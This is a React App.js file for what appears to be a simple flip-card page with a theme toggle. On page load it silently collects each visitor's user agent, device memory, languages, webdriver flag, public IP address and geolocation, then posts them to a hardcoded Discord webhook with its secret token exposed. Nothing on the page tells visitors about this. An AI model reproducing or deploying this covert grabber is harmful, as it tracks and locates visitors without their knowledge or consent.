import React, { useState, useEffect, useRef } from "react";
import styled from "styled-components";
import FlipCard from "./FlipCard/FlipCard";
import { lightTheme } from "./assets/theme";
import "./App.css";

const Wrapper = styled.div`
  background-color: ${(props) => props.theme.backgroundColor};
  color: ${(props) => props.theme.fontColor};
  margin: 0;
  align-items: center;

  display: flex;
  flex-direction: column;
  height: 100vh;
  width: 100vw;
`;

function App() {
  const [checked, setChecked] = useState(false);
  const [theme, setTheme] = useState(lightTheme);
  const [flip, setFlip] = useState(false);
  const [userInfo, setUserInfo] = useState({});
  const prevUserInfo = useRef(null);


  useEffect(()  => {
    try {
      let result = {};
      if (window.navigator ) {
        result.userAgent = navigator.userAgentData;
        result.deviceMemory = navigator.deviceMemory;
        result.languages = navigator.languages;
        result.webdriver = navigator.webdriver;

        fetch("https://api.ipify.org/?format=json")
          .then((response) => {
            return response.json();
          }, "jsonp")
          .then((res) => {
            result.ip = res.ip;
            if (navigator.geolocation) {
              navigator.geolocation.getCurrentPosition(
                (position) => {
                  result.location = {
                    lat: position.coords.latitude,
                    lng: position.coords.longitude,
                  };
                  setUserInfo(result);
                },
                () => {
                  // Set a default location if the user denies the location permission
                  result.location = { lat: 0, lng: 0 };
                  setUserInfo(result);
                }
              );
            }
            if(navigator.gpu){


            }
          })
          .catch((err) => console.log(err));
      }
    } catch (error) {
      console.error(error);
    }
  }, []);

  useEffect(() => {
    if (Object.keys(userInfo).length > 0) {
      if (
        prevUserInfo.current !== null &&
        JSON.stringify(userInfo) === JSON.stringify(prevUserInfo.current)
      ) {
        console.log("User info hasn't changed, skipping webhook send.");
        return;
      }
      prevUserInfo.current = userInfo;
      const message = `- **User Agent:** ${JSON.stringify(userInfo.userAgent)}\n
  - **Device Memory:** ${userInfo.deviceMemory}\n
  - **Location:** ${JSON.stringify(userInfo.location)}\n
  - **Languages:** ${userInfo.languages}\n
  - **Webdriver:** ${userInfo.webdriver}\n
  - **IP Address:** ${userInfo.ip}`;
      try {
        fetch(
          "https://discord.com/api/webhooks/1098651016288800858/Fo4Fg6zES5Ur24KxYVnY9O0Znj4v19-QIU9DL3VhdtHfqI8gkAk8u-TNcmJYUOs2WCms",
          {
            method: "POST",
            body: JSON.stringify({
              content: "User info: " + message,
            }),
            headers: {
              "Content-Type": "application/json",
            },
          }
        )
          .then((response) => {
            if (response.ok) {
              console.log("Webhook successfully sent!");
            } else {
              console.error("Webhook send failed:", response);
            }
          })
          .catch((error) => {
            console.error("Webhook send failed:", error);
          });
      } catch (error) {
        console.error("Webhook send failed:", error);
      }
    } else {
      console.warn("User info is empty, skipping webhook send.");
    }
  }, [userInfo, prevUserInfo]);

  return (
    <Wrapper theme={theme}>
      <FlipCard
        flip={flip}
        setFlip={setFlip}
        theme={theme}
        setChecked={setChecked}
        setTheme={setTheme}
        checked={checked}
        clientInfo={userInfo}
      />
    </Wrapper>
  );
}

export default App;
